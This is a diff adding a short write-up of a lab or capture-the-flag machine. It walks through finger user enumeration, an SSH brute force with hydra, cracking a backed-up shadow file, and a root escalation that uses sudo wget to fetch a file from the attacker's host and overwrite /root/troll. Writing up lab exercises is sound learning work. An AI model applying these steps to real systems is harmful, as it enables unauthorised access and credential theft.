@@ -1,0 +1,25 @@
+Step 1 (Scanning)
+- target was scanned and rescanned using ICMP
+
+Step 2 (Enumeration)
+- target has ports 79 (finger), 22022 (SSH) running
+- finger protocol allows for user enumeration through 'https://github.com/pentestmonkey/finger-user-enum'
+- username sunny was then bruteforced using hydra against the SSH port
+
+Step 3 (Foothold)
+- through the bruteforce we see the password is sunday for user sunny
+- to SSH into the box we need the syntax 'sudo SSH -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.14.21 -p22022'
+- sudo -l shows we can run /root/troll file as sudo
+- going into the /backup directory we see a shadow file backup
+- using hashcat we see the password for user sammy is 'cooldude!'
+
+Step 4 (Lateral movement)
+- logging into sammy through another SSH session using the syntax 'sudo SSH -oKexAlgorithms=+diffie-hellman-group1-sha1 sammy@10.10.14.21 -p22022'
+- we see through sudo -l we can run wget as sudo
+- we make a file on our system called troll and simply type 'bash' inside of it
+- using the syntax 'sudo wget 10.10.14.21:80/troll -O /root/troll' we over write the troll file with out file
+
+Step 5 (Priviledge escalation)
+- As soon as the wget command goes through, running the /root/troll file as sudo we return a root shell.
+
+Step 6 (Pilfering)
